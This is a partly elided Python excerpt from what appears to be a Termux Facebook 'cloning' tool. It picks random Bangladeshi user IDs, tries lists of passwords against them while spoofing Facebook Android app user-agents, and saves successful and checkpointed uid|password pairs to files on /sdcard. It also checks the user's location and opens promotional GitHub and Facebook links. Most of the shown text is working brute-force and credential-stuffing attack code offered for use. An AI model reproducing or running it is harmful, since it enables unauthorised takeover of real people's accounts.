...
try:
    ...
    print('\n \033[1;91m[\033[1;93mS-JK404(=)\033[1;91m]\033[1;97m Comeing....\n')
    time.sleep(0.5)
...
try:
    ...
    print('\n \033[1;91m[\033[1;93mJikuXD\033[1;91m]\033[1;97m bs4 installing... [×]\n')
    time.sleep(0.5)
...
try:
    ...
    if "Bangladesh" not in ___ccc___:
       os.system('xdg-open https://github.com/S-JK404')
       print("\033[1;91m[√]Fuck bypass user..")
       time.sleep(3);exit()
except requests.exceptions.ConnectionError:
...
def mahadi():
    os.system('clear')
    logo()
    print(f"{white}[{green}A{white}] {warna}BD RANDOM")
    print(f"{white}[{green}B{white}] {warna}Admin Info")
    print(f"{white}[{green}C{white}] {warna}JOIN MESSENGER GROUP[Comeing]")
    print(f"{white}[{green}D{white}] {warna}EXIT PROGRAMMING")
    _____mahadi_____ = input(f'{white}[{green}+{white}] {warna}SELECT : {yelloww}')
...
def ___uids___():
    ...
    os.system('xdg-open https://github.com/S-JK404')
    code = input(f"{white}[{warna}+{white}] SELECT      {green}: {white}")
    print(f"{white}[{green}+{white}] EXAMPLE {green}    : 1000,5000,10000,15000,20000")
    os.system('xdg-open https://www.facebook.com/S-JK404')
...
def ___random___(ids,passlist):
    try:
        global oks,loop
        sys.stdout.write(f'\r\r{warna}[{warna}SU HA{warna}]{white}<>{warna}[{yelloww}%s{rad}]{white}<>{rad}[{green}SU HA:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
           ...
           #___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2060};'+f'FBLC/it_IT;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            #___MSUA___ = '[FBAN/MessengerLite;FBAV/309.0.0.15.89;FBPN/com.facebook.mlite;FBLC/sv_SE;FBBV/382797562;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/SM-S901U;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=944,height=1891};FB_FW/1;]'
         ...
         #   ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2145};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
           ...
           #___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2076};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            ...
            if 'session_key' in q:
                ...
                if 'Photoshop' in res:
                    print('\r\r\033[1;31m[\033[1;32mSUHA\033[1;31m]\033[1;32m '+uid+' | '+pas+'\033[1;97m')
                    open('/sdcard/suha-OK.txt','a').write(uid+'|'+pas+'\n')
                    oks.append(ids)
                    break
                else:pass
            elif 'www.facebook.com' in q['error_msg']:
                print(f'\r\r\x1b[38;5;208m[SU HA-CP] '+ids+' | '+pas+'\033[1;97m')
                open('/sdcard/SUHA-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
